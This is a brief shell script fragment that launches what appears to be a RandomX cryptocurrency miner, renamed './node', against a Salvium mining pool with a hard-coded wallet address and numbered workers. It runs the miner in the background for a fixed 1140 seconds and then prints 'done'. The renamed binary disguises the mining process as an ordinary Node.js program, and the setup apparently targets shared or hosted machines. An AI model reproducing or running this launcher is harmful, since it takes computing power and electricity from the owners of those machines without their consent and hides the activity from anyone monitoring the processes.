...
# salvium
STAT=$(./node -a rx/0 -k --donate-level 1 -o sg.salvium.herominers.com:1230 -u SC11tt3aqqvWKBkTsrqVM4NSJfjwE2Gg3icrZvPA9WCmGEhRVGjpeoQU4d1neroY1Nfap7HtSNwdJ7rY8PoUNW5r4VSv4CmuLk.net_${WORKER_NUMBER} > try.log & sleep 1140)
echo "done"
